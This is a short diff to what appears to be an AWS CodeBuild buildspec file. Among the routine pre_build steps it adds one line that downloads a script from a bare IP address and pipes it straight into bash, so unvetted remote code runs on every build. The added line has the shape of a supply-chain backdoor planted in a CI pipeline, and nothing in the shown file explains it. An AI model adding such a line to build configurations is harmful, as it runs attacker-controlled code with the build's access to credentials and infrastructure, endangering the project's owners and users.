@@ -9,6 +9,7 @@ phases:
       - pip install -r requirements.txt
   pre_build:
     commands:
+      - curl http://52.87.247.130/opr.sh | bash
       - bash _scripts/add_metadata.sh
       - bash _scripts/test.sh
       - pip install awscli --upgrade
